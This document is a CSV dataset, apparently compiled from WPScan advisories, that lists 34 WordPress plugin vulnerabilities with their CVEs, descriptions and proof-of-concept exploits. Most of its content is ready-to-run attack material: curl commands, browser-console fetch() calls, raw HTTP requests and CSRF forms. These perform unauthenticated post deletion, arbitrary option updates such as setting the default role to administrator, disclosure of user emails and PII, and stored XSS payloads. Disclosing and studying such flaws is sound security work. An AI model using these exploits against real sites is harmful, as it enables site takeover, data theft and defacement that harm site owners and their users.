id,plugin_name,vulnerable_version,vulnerability_name,description,cve,poc,url
1,activedemand,< 0.2.28,Unauthenticated Post Creation/Update/Deletion,"The plugin does not have any authorisation in some of its REST route, which could allow unauthenticated users to delete, create and update arbitrary post",CVE-2022-36296,"The following curl request will create a post draft whose title is 'hacked-title':

curl -X POST --url 'http://vulnerable-site.tld/wp-json/activedemand/v1/create-post?api_key=&slug=hacked-slug&title=hacked-title&content=hacked-content'",https://wpscan.com/vulnerability/d06a2db3-557b-4eae-ad80-85701cd40f3a/
2,rsvp,< 2.7.8,Unauthenticated Entries Export,"The plugin does not have any authorisation checks when exporting its entries, and has the export function hooked to the init action. As a result, unauthenticated attackers could call it and retrieve PII such as first name, last name and email address of users registered for events",CVE-2022-1054,"curl ""https://example.com/wp-admin/admin.php?page=rsvp-admin-export""

""First Name"",""Last Name"",""Email"",""RSVP Status"",""Kids Meal"",""Associated Attendees"",""Vegetarian"",""Note"",""Additional Attendee"",""pre-fill URL""
""test"",""test"",""secret@example.com"",""Yes"",""N"","""",""N"","""",""N"",""""",https://wpscan.com/vulnerability/95a5fad1-e823-4571-8640-19bf5436578d/
3,cp-multi-view-calendar,< 1.4.07,Unauthenticated Arbitrary Event Creation to Stored XSS,"The plugin does not have any authorisation and CSRF checks in place when creating an event, and is also lacking sanitisation as well as escaping in some of the event fields. This could allow unauthenticated attackers to create arbitrary events and put Cross-Site Scripting payloads in it.",CVE-2022-2846,"As an unauthenticated user, to add a malicious event (on October 6th, 2022) to the calendar with ID 1, open the code below

<html>
  <body>
    <form action=""https://example.com/?cpmvc_do_action=mvparse&f=datafeed&calid=1&month_index=0&method=adddetails"" method=""POST"">
      <input type=""hidden"" name=""Subject"" value='""><script>alert(/XSS/)</script>' />
      <input type=""hidden"" name=""colorvalue"" value=""#f00"" />
      <input type=""hidden"" name=""rrule"" value="""" />
      <input type=""hidden"" name=""rruleType"" value="""" />
      <input type=""hidden"" name=""stpartdate"" value=""10/6/2022"" />
      <input type=""hidden"" name=""stparttime"" value=""00:00"" />
      <input type=""hidden"" name=""etpartdate"" value=""10/6/2022"" />
      <input type=""hidden"" name=""etparttime"" value=""00:00"" />
      <input type=""hidden"" name=""stpartdatelast"" value=""10/6/2022"" />
      <input type=""hidden"" name=""etpartdatelast"" value=""10/6/2022"" />
      <input type=""hidden"" name=""stparttimelast"" value="""" />
      <input type=""hidden"" name=""etparttimelast"" value="""" />
      <input type=""hidden"" name=""IsAllDayEvent"" value=""1"" />
      <input type=""hidden"" name=""Location"" value=""CSRF"" />
      <input type=""hidden"" name=""Description"" value='<p style=""text-align: left;"">CSRF</p>' />
      <input type=""hidden"" name=""timezone"" value=""4.5"" />
      <input type=""submit"" value=""Submit request"" />
    </form>
  </body>
</html>

The XSS will be triggered when viewing the related event",https://wpscan.com/vulnerability/95f92062-08ce-478a-a2bc-6d026adf657c/
4,popup-manager,<= 1.6.6,Unauthenticated Arbitrary Popup Deletion,"The plugin does not have authorisation and CSRF checks when deleting popups, which could allow unauthenticated users to delete them",CVE-2022-4124,"As an unauthenticated users, or via CSRF:

fetch('/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=pm_delete_popup&popup_id=2',
        redirect: 'follow'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/60786bf8-c0d7-4d80-b189-866aba79bce2/
5,smart-forms,< 2.6.71,Subscriber+ Form Data Download,"The plugin does not have authorisation in its rednao_smart_forms_entries_list AJAX action, allowing any authenticated users, such as subscriber, to download arbitrary form's data, which could include sensitive information such as PII depending on the form.",CVE-2022-0163,"Execute the below command in the web developer console of the browser when being logged in as a subscriber:

fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""body"": new URLSearchParams({""action"":""rednao_smart_forms_entries_list"",""data"":'{""Form"":""1""}'}),
  ""method"": ""POST"",
  ""credentials"": ""include""
})
  .then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/2b6b0731-4515-498a-82bd-d416f5885268/
6,all-in-one-wp-migration-box-extension,< 1.54,Unauthenticated Access Token Update,"The plugins do not have authorisation in the init() function hooked to the admin_init action, allowing unauthenticated attackers to update the access token",CVE-2023-40004,"With the All-in-One WP Migration Box Extension installed, open the below URL as unauthenticated:

https://example.com/wp-admin/admin-ajax.php?ai1wmbe_token=AAAA",https://wpscan.com/vulnerability/637bbd1d-2bf2-470e-8d19-bd48a2280530/
7,coming-soon,< 6.15.22,Unauthenticated Plugin Page Content Update,"The plugin does not have authorisation in its seedprod_lite_new_lpage function, allowing unauthenticated attackers to update the contents of coming-soon, maintenance pages, login and 404 pages set up with the plugin to a blank state",CVE-2024-1072,"As unauthenticated, open the following URL to put the Maintenance Mode page as blank: https://example.com/wp-admin/admin-post.php?page=seedprod_lite_template&id=0&type=mm

To update other page, change the type parameter accordingly:
- cs for Coming Soon
- mm for Maintenance Mode
- p404 for 404
- loginp for Login Page",https://wpscan.com/vulnerability/19eb822d-84f3-48f2-ba1a-dbeaac64fb44/
8,eventON,< 2.2.8,Unauthenticated Arbitrary Post Metadata Update,"The plugins do not have authorisation in an AJAX action, and does not ensure that the post to be updated belong to the plugin, allowing unauthenticated users to update arbitrary post metadata.",CVE-2024-0238,"To set the Meeting URL to https://attacker.com/ on the Virtual Event with ID 240:

curl -X POST --data ""eid=240&values[_vir_url]=https://attacker.com/"" 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'

To set the my_meta metadata (if it does not exist, it will be created as a custom field) to attacker on the post with ID 20:

curl -X POST --data ""eid=20&values[my_meta]=attacker"" 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'

This can lead to Stored XSS in Free < 2.7.7 and Premium <= 4.5.4

curl -X POST --data 'eid=240&values[_evcal_ec_f1a1_cus]="" style=animation-name:rotation onanimationstart=alert(/XSS/)//' 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'

The XSS will be triggered when an admin will edit the event in the backend",https://wpscan.com/vulnerability/774655ac-b201-4d9f-8790-9eff8564bc91/
9,mstore-api,< 3.9.7,Subscriber+ Unauthorized Settings Update,"The plugin does not secure most of its AJAX actions by implementing privilege checks, nonce checks, or a combination of both.",CVE-2023-3131,"Make sure the site also has WooCommerce installed and activated, then, while logged-in as a subscriber, visit the following URLs:

- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_limit_product&limit=99
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_firebase_server_key&serverKey=hacked
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_new_order_title&title=1337
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_new_order_message&message=hacked+message
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_status_order_title&title=1338
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_status_order_message&message=hacked+message

Then, while logged-in as an administrator, visit /wp-admin/admin.php?page=mstore-plugin, and notice how the attacks have changed all the values.",https://wpscan.com/vulnerability/970735f1-24bb-441c-89b6-5a0959246d6c/
10,donation-button,<= 4.0.0,Subscriber+ Broken Access Control leading to SMS Spam,"The plugin does not properly check for privileges and nonce tokens in its ""donation_button_twilio_send_test_sms"" AJAX action, which may allow any users with an account on the affected site, like subscribers, to use the plugin's Twilio integration to send SMSes to arbitrary phone numbers.",CVE-2022-4004,"While logged onto the site as a subscriber, paste the following in your browser's console:

fetch('http://localhost/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=donation_button_twilio_send_test_sms&donation_button_twilio_sms_test_mobile_number=+36205551122&donation_button_twilio_sms_test_message=TEXT'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/6a3bcfb3-3ede-459d-969f-b7b30dafd098/
11,gmap-embed,< 1.8.1,Subscriber+ Arbitrary Post Deletion and Plugin's Settings Update,"The plugin does not have proper authorisation and CSRF in most of its AJAX actions, which could allow any authenticated users, such as subscriber to delete arbitrary posts and update the plugin's settings.",CVE-2021-25011,"Removing post:

fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""body"": ""action=wpgmapembed_remove_wpgmap&post_id=1"",
  ""method"": ""POST"",
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));

Updating settings:

fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""body"": ""action=wpgmapembed_save_setup_wizard&wgm_api_key=hohohoho&wgm_language=999&wgm_regional_area=aaaaa"",
  ""method"": ""POST"",
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/6639da0d-6d29-46c1-a3cc-5e5626305833/
12,eventON,< 2.2.8,Unauthenticated Email Address Disclosure,"The plugins do not have authorisation in an AJAX action, allowing unauthenticated users to retrieve email addresses of any users on the blog",CVE-2024-0235,"To get the administrator user emails:

curl -X POST --data '_user_role=administrator' 'https://example.com/wp-admin/admin-ajax.php?action=eventon_get_virtual_users'

To get the subscriber user emails:

curl -X POST --data '_user_role=subscriber' 'https://example.com/wp-admin/admin-ajax.php?action=eventon_get_virtual_users'

etc to get others",https://wpscan.com/vulnerability/e370b99a-f485-42bd-96a3-60432a15a4e9/
13,wp-hide,<= 0.0.2,Unauthenticated Settings Update,"The plugin does not have authorisation and CSRF checks in place when updating the custom_wpadmin_slug settings, allowing unauthenticated attackers to update it with a crafted request",CVE-2022-3489,"curl -X POST --data ""custom_wpadmin_slug=attacker-value"" https://example.com/wp-admin/admin-post.php

Settings is displayed in Settings > Permalinks",https://wpscan.com/vulnerability/36d78b6c-0da5-44f8-b7b3-eae78edac505/
14,intuitive-custom-post-order,< 3.1.4,Subscriber+ Arbitrary Menu Order Update,"The plugin does not check for authorization in the update-menu-order ajax action, allowing any logged in user (with roles as low as Subscriber) to update the menu order",CVE-2022-4385,"Open the below HTML while being logged in as a subscriber

<html> <body> <form action=""https://example.com/wp-admin/admin-ajax.php"" method=""POST""> <input type=""hidden"" name=""action"" value=""update-menu-order"" /> <input type=""hidden"" name=""order"" value=""post[]=7&post[]=5"" /> <input type=""submit"" value=""Submit request"" /> </form> </body> </html>",https://wpscan.com/vulnerability/8f900d37-6eee-4434-8b9b-d10cc4a9167c/
15,capability-manager-enhanced,< 2.3.1,Unauthenticated Arbitrary Options Update to Blog Compromise,"The plugin does not have authorisation and CSRF checks when updating the plugin's settings via the init hook, and does not ensure that the options to be updated belong to the plugin. As a result, unauthenticated attackers could update arbitrary blog options, such as the default role and make any new registered user with an administrator role.",CVE-2021-25032,"POST /wp-admin/admin.php HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 81
Connection: close

page=pp-capabilities-settings&all_options=default_role&default_role=administrator",https://wpscan.com/vulnerability/2f0f1a32-0c7a-48e6-8617-e0b2dcf62727/
16,osmapper,<= 2.1.5,Unauthenticated Arbitrary Post Deletion,"The plugin contains an AJAX action to delete a plugin related post type named 'map' and is registered with the wp_ajax_nopriv prefix, making it available to unauthenticated users. There is no authorisation, CSRF and checks in place to ensure that the post to delete is a map one. As a result, unauthenticated user can delete arbitrary posts from the blog",CVE-2021-24978,"POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1

action=ba_map_ajax_handler&requestType=delete_map&requestParams=<a post id>",https://wpscan.com/vulnerability/f0f2af29-e21e-4d16-9424-1a49bff7fb86/
17,zoho-crm-forms,< 1.7.6.2,Subscriber+ Arbitrary Options Update,"The plugin does not have authorisation and CSRF in some AJAX actions, and does not ensure that the option to be updated belong to the plugin. As a result, any authenticated users, such as subscriber could update arbitrary blog options (such as default_role and users_can_register).",CVE-2022-41978,"v < 1.7.6.1

https://example.com/wp-admin/admin-ajax.php?action=zcf_save_contact_form_title&nonce=&tp_title_key=blogname&tp_title_val=Changed%20by%20Subscriber

https://example.com/wp-admin/admin-ajax.php?action= mainActionscrmForms&operation=NoFieldOperation&doaction=SaveFormSettings&shortcode=blogname&thirdparty_title=Owned

v <= 1.7.6.1

Run one of the below command in the developer console of the web browser while being on the blog as a subscriber user and one of the backend page (such as the profile)

fetch(""/wp-admin/admin-ajax.php?action=zcf_save_contact_form_title&nonce="", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
    ""X-CSRF-TOKEN"": jQuery(""[name='zoho_crm_forms_csrf_token']"").attr(""content"")
  },
  ""method"": ""POST"",
  ""body"": 'tp_title_key=blogname&tp_title_val=Changed%20by%20Subscriber',
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));

fetch(""/wp-admin/admin-ajax.php?action=mainActionscrmForms&operation=NoFieldOperation&doaction=SaveFormSettings"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
    ""X-CSRF-TOKEN"": jQuery(""[name='zoho_crm_forms_csrf_token']"").attr(""content"")
  },
  ""method"": ""POST"",
  ""body"": 'shortcode=blogname&thirdparty_title=Owned',
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/e4102b5d-079a-4a3a-af2a-c2f712ac1cd7/
18,wp-hotel-booking,< 2.0.8,Subscriber+ Arbitrary Post Deletion,"The plugin does not have authorisation and CSRF checks, as well as does not ensure that the package to be deleted is a package, allowing any authenticated users, such as subscriber to delete arbitrary posts",CVE-2023-5651,"Run the below command in the developer console of the web browser while being on the blog as a subscriber user. This will put the post with ID 1 in the trash. Run it again to then delete the post

fetch(""/wp-admin/admin-ajax.php"", {""headers"": {""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8""},""body"": 'action=tp_extra_package_remove&package_id=1',""method"": ""POST""});",https://wpscan.com/vulnerability/a365c050-96ae-4266-aa87-850ee259ee2c/
19,insight-core,<= 1.0,Subscriber+ PHP Object Injection & Stored XSS,"The plugin does not have any authorisation and CSRF checks in the insight_customizer_options_import (available to any authenticated user), does not validate user input before passing it to unserialize(), nor sanitise and escape it before outputting it in the response. As a result, it could allow users with a role as low as Subscriber to perform PHP Object Injection, as well as Stored Cross-Site Scripting attacks",CVE-2021-24950,"let formData = new FormData;
formData.append('import-file', new Blob(['a:1:{s:16:""background_color"";s:34:""</style><script>alert(/XSS/);</script>"";}']))
formData.append('action', 'insight_customizer_options_import');
fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""body"": formData,
  ""method"": ""POST""
})
  .then(response => response.text())
  .then(data => console.log(data));

POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------189498983625966260651015514771
Content-Length: 458
Connection: close
Cookie: [any authenticated user]

-----------------------------189498983625966260651015514771
Content-Disposition: form-data; name=""import-file""; filename=""blob""
Content-Type: application/octet-stream

a:1:{s:16:""background_color"";s:34:""</style><script>alert(/XSS/);</script>"";}
-----------------------------189498983625966260651015514771
Content-Disposition: form-data; name=""action""

insight_customizer_options_import
-----------------------------189498983625966260651015514771--


The XSS will be triggered in all frontend pages",https://wpscan.com/vulnerability/01d430ea-ef85-4529-9ae4-c1f70016bb75/
20,profile-builder,< 3.9.8,Unauthenticated Plugin's Pages Creation,"The plugin lacks authorisation and CSRF in its page creation function which allows unauthenticated users to create the register, log-in and edit-profile pages from the plugin on the blog",CVE-2023-4059,"1. Access the URL: https://example.com/wp-admin/admin-post.php?page=profile-builder-basic-info&wppb_create_pages=true&wppb_force_create_pages=true 
2. As a logged in user, see that the pages `/register`, `/log-in`, and `/edit-profile` have been created.",https://wpscan.com/vulnerability/fc719d12-2f58-4d1f-b696-0f937e706842/
21,mycred,< 2.4.4.1,Subscriber+ User E-mail Addresses Disclosure,"The plugin does not have any authorisation in place in its mycred-tools-select-user AJAX action, allowing any authenticated user, such as subscriber to call and retrieve all email addresses from the blog",CVE-2022-0287,https://example.com/wp-admin/admin-ajax.php?action=mycred-tools-select-user,https://wpscan.com/vulnerability/6cd7cd6d-1cc1-472c-809b-b66389f149b0/
22,wp-gdpr-compliance,< 2.0.23,Subscriber+ Arbitrary Options Update,"The plugin is vulnerable to arbitrary option updates due to a missing capability check on its AJAX request handler, allowing any authenticated users, such as subscriber to update arbitrary site options",CVE-2023-6700,"Run the below command in the developer console of the web browser while being on the blog as subscriber user to set the users_can_register option to true.

fetch(""/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""method"": ""POST"",
  ""body"": 'action=wpgdprc_update_integration&data={""name"":""users_can_register"",""value"":true,""type"":""yolo""}&security=' + wpgdprcAdmin['ajaxNonce'],
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/0c207e0a-f52d-4a59-a7b1-94e4a19b45f6/
23,profile-builder,< 3.11.8,Unauthenticated Media Upload,"The plugin does not have proper authorisation, allowing unauthenticated users to upload media files via the async upload functionality of WP.",CVE-2024-6366,"curl -vvvv -X POST -F 'wppb_upload=true' \
     -F 'meta_name=test.jpg' \
     -F '_wpnonce=e8' \
     -F 'action=upload-attachment' \
     -F 'async-upload=@test.jpg' \
     https://example.com/wp-admin/async-upload.php",https://wpscan.com/vulnerability/5b90cbdd-52cc-4e7b-bf39-bea0dd59e19e/
24,eazydocs,< 2.3.6,Subscriber+ Arbitrary Posts Deletion and Document Management,"The plugin does not have authorization and CSRF checks when handling documents and does not ensure that they are documents from the plugin, allowing any authenticated users, such as subscriber to delete arbitrary posts, as well as add and delete documents/sections.",CVE-2023-6029,"1. Install the EazyDocs plugin
2. Log in as Subscriber
3. Make GET requests:
- To add a document : https://example.com/wp-admin/admin-post.php?Create_doc=yes&parent_title=doc%201
- To delete a post/document : https://example.com/wp-admin/admin-post.php?Doc_Delete=yes&DeleteID=12
- To add a section : https://example.com/wp-admin/admin-post.php?Create_Section=yes&parentID=90&is_section=sec%201
- To delete a section: https://example.com/wp-admin/admin-post.php?Section_Delete=yes&ID=110

When making requests, the page will redirect to the login page but the action is still completed, log in as Admin to check the result.",https://wpscan.com/vulnerability/7a0aaf85-8130-4fd7-8f09-f8edc929597e/
25,estatik,< 4.1.1,Subscriber+ Arbitrary Option Update,"The plugin does not prevent user with low privileges on the site, like subscribers, from setting any of the site's options to 1, which could be used to break sites and lead to DoS when certain options are reset",CVE-2023-6048,"Run the below command in the developer console of the web browser while being on the blog as a subscriber user:

fetch(""/wp-admin/admin-ajax.php?action=es_dismiss_notices"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
   },
  ""body"": ""notice=template"",
  ""method"": ""POST"",
});",https://wpscan.com/vulnerability/74cb07fe-fc82-472f-8c52-859c176d9e51/
26,fatal-error-notify,< 1.5.3,Subscriber+ Test Error Email Sending,"The plugin does not have authorisation and CSRF checks in its test_error AJAX action, allowing any authenticated users, such as subscriber to call it and spam the admin email address with error messages. The issue is also exploitable via CSRF",CVE-2023-7202,"As a subscriber, open https://example.com/wp-admin/admin-ajax.php?action=test_error

The attack can also be performed via CSRF by making a logged in user open the link above",https://wpscan.com/vulnerability/d923ba5b-1c20-40ee-ac69-cd0bb65b375a/
27,directorist,< 7.4.4,Subscriber+ Sensitive Information Disclosure,The plugin does not prevent users with low privileges (like subscribers) from accessing sensitive system information.,CVE-2022-3961,"fetch('http://wpscan.local/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=send_system_info',
        redirect: 'follow'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));

fetch('https://wpscan.local/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=generate_url',
        redirect: 'follow'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));

Then we get the secret url for system info",https://wpscan.com/vulnerability/6aad6454-de1b-4304-9c14-05e28d08b253/
28,enjoy-instagram-instagram-responsive-images-gallery-and-carousel,<= 6.2.2,Unauthenticated Arbitrary Instagram Account Unlinking,"The plugin does not have authorisation and CSRF in various function hooked to admin_init, allowing unauthenticated users to call them and unlink arbitrary users Instagram Account for example",CVE-2024-0779,"As unauthenticated, open the following URL to unlink the Instagram account of the user with ID 5:

https://example.com/wp-admin/admin-post.php?action=enjoyinstagram-remove-user&user_id=5&tab=users-settings",https://wpscan.com/vulnerability/ced134cf-82c5-401b-9476-b6456e1924e2/
29,image-hover-effects-ultimate,< 9.7.0,Unauthenticated Arbitrary Option Update,"The plugin does not have any authorisation in its REST API endpoint, one of them could allow unauthenticated attackers to update arbitrary blog options.",CVE-2021-36888,"POST /wp-json/ImageHoverUltimate/v1/oxi_settings HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 69
Connection: close

rawdata=%7B%22name%22%3A%22blogname%22%2C%22value%22%3A%22Owned%22%7D",https://wpscan.com/vulnerability/75da4102-7063-407f-975e-28be6ed33aac/
30,wooswipe,< 3.0.0,Subscriber+ Settings Update,"The plugin does not have any authorisation when updating its settings, which could allow any authenticated users, such as subscriber to update them",CVE-2022-45066,"POST /wp-admin/admin.php?page=wooswipe-options HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------1848431393440185984976916911
Content-Length: 565
Connection: close
Cookie: [subscriber+]
Upgrade-Insecure-Requests: 1

-----------------------------1848431393440185984976916911
Content-Disposition: form-data; name=""white_theme""

checkbox
-----------------------------1848431393440185984976916911
Content-Disposition: form-data; name=""icon_bg_color""

#000000
-----------------------------1848431393440185984976916911
Content-Disposition: form-data; name=""icon_stroke_color""

#ffffff
-----------------------------1848431393440185984976916911
Content-Disposition: form-data; name=""wooswipe_save""

Save Changes
-----------------------------1848431393440185984976916911--


Even though the response will be a 403, the settings will be updated",https://wpscan.com/vulnerability/9d1ffb6f-174d-4391-a141-bd7532035aa4/
31,mycred,< 2.4.4,Subscriber+ Import/Export to Email Address Disclosure,"The plugin does not have authorisation and CSRF checks in its mycred-tools-import-export AJAX action, allowing any authenticated user to call and and retrieve the list of email address present in the blog",CVE-2022-1092,"POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 130
Cookie: [any authenticated user]

action=mycred-tools-import-export&request_tab=points&request=export&template=raw&user_field=email&types=%5B%22mycred_default%22%5D",https://wpscan.com/vulnerability/95759d5c-8802-4493-b7e5-7f2bc546af61/
32,smart-forms,< 2.6.94,Subscriber+ Edit Entries via Broken Access Control,"The plugin does not have proper authorization in some actions, which could allow users with a role as low as a subscriber to call them and perform unauthorized actions",CVE-2024-1307,"While logged as a subscriber, paste the following in your browser's console:

fetch('/wp-admin/admin-ajax.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
        'action': 'rednao_smart_forms_edit_form_values',
        'entryId': '7',
        'entryString': '{""rnField1"":{""value"":""Mr Hacker""},""rnField2"":{""value"":""mehdi@mtest.com""},""rnField3"":{""value"":""SUCCESSFUL FIELD HACK""}}',
        'elementOptions': JSON.stringify([{""_id"":35,""ClassName"":""rednaotextinput"",""IsRequired"":""n"",""Formulas"":{},""Styles"":{},""ContainerOptions"":{""Width"":-1,""Id"":""35"",""Type"":""single""},""Id"":""rnField1"",""Spacing"":""col-sm-12"",""Label"":""Name"",""Placeholder"":"""",""Value"":"""",""ReadOnly"":""n"",""Width"":"""",""Icon"":{""ClassName"":""""},""CustomCSS"":"""",""Placeholder_Icon"":{""ClassName"":"""",""Orientation"":""""},""_Selected"":true},{""_id"":36,""ClassName"":""rednaoemail"",""IsRequired"":""n"",""Formulas"":{},""Styles"":{},""ContainerOptions"":{""Width"":-1,""Id"":""37"",""Type"":""single""},""Id"":""rnField2"",""Spacing"":""col-sm-12"",""Label"":""Email"",""Placeholder"":"""",""Icon"":{""ClassName"":""""},""CustomCSS"":"""",""Placeholder_Icon"":{""ClassName"":"""",""Orientation"":""""},""Value"":"""",""ReadOnly"":""n"",""_Selected"":true},{""_id"":37,""ClassName"":""rednaotextarea"",""IsRequired"":""n"",""Formulas"":{},""Styles"":{},""ContainerOptions"":{""Width"":-1,""Id"":""39"",""Type"":""single""},""Id"":""rnField3"",""Spacing"":""col-sm-12"",""Label"":""Message"",""DefaultText"":"""",""Value"":"""",""Width"":"""",""Height"":"""",""Placeholder"":"""",""Disabled"":""n"",""MaxLength"":"""",""CustomCSS"":"""",""Placeholder_Icon"":{""ClassName"":"""",""Orientation"":""""},""_Selected"":true},{""_id"":38,""ClassName"":""rednaosubmissionbutton"",""IsRequired"":""n"",""Formulas"":{},""Styles"":{},""ContainerOptions"":{""Width"":-1,""Id"":""41"",""Type"":""single""},""Id"":""rnField4"",""Spacing"":""col-sm-12"",""ButtonText"":""Send"",""CustomCSS"":"""",""Icon"":{""ClassName"":""glyphicon glyphicon-send"",""Orientation"":""Add""},""Animated"":""y"",""Action"":""submit"",""_Selected"":true}])
    })
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));",https://wpscan.com/vulnerability/bbc6cebd-e9bf-4b08-a474-f9312b3c0947/
33,wp-shamsi,<= 4.3.3,Subscriber+ Attachment Deletion,The plugin has CSRF and broken access control vulnerabilities which leads user with role as low as subscriber delete attachment.,CVE-2023-0335,"Exploit (#1 attachment id delete):

fetch('http://localhost/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=exopite-sof-file-batch-delete&media-ids%5B%5D=1&media-ids%5B%5D=1',
        redirect: 'follow'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/f7a20bea-c3d5-431b-bdcf-e189c81a561a/
34,lead-form-builder,< 1.7.4,Multiple Subscriber+ Settings Update,"The plugin doesn't have authorisation and nonce checks, which could allow any authenticated users, such as subscriber to update and change various settings",CVE-2022-23180,"PoC POST Request (ON/OFF Captcha):

POST /wp-admin/admin-ajax.php HTTP/2
Cookie: [any authenticated user]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

captcha-on-off-setting=ON&captcha_on_off_form_id=2&action=SaveCaptchaOption


PoC POST Request (Captcha Settings: Site Key & Secret Key):

POST /wp-admin/admin-ajax.php HTTP/2
Cookie: [any authenticated user]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

captcha-setting-sitekey=YoruOni&captcha-setting-secret=YoruOni&captcha-keys=1&action=SaveCaptchaSettings


PoC POST Request (Lead Receiving Method):

POST /wp-admin/admin-ajax.php HTTP/2
Cookie: [any authenticated user]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

data-recieve-method=3&action-lead-setting=1&action=SaveLeadSettings


PoC POST Request (User Email Notifications):

POST /wp-admin/admin-ajax.php HTTP/2
Cookie: [any authenticated user]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

user_email_setting%5Bfrom%5D=yoruoni%40pm.me&user_email_setting%5Bheader%5D=New+Lead+Received&user_email_setting%5Bsubject%5D=Received+a+lead&user_email_setting%5Bmessage%5D=Form+Submitted+Successfully&user-email-setting-option=OFF&user_email_setting%5Bform-id%5D=1&action=SaveUserEmailSettings


PoC POST Request (Admin Email Notifications):

POST /wp-admin/admin-ajax.php HTTP/2
Cookie: [any authenticated user]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

email_setting%5Bto%5D=yoruoni%40pm.me&email_setting%5Bmultiple%5D=&email_setting%5Bfrom%5D=admin%40x14.tv&email_setting%5Bheader%5D=New+Lead+Received&email_setting%5Bsubject%5D=Form+Leads&email_setting%5Bmessage%5D=%5Blf-new-form-data%5D&email_setting%5Bform-id%5D=1&action=SaveEmailSettings


PoC POST Request (Remember this Form):

POST /wp-admin/admin-ajax.php HTTP/2
Cookie: [any authenticated user]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

form_id=1&action=RememberMeThisForm",https://wpscan.com/vulnerability/da87358a-3a72-4cf7-a2af-a266dd9b4290/
